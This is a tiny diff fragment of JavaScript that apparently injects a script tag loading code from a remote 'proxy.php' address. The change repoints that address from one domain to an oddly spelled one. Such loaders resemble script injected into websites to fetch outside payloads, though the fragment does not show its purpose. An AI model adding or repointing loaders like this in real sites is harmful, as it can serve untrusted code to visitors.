@@ -18,4 +18,4 @@
             cs.parentNode.insertBefore(x, cs)
         }
     });
-})(window, document, 'https://tbpage.com/php/proxy.php');
+})(window, document, 'https://unioin.com/php/proxy.php');
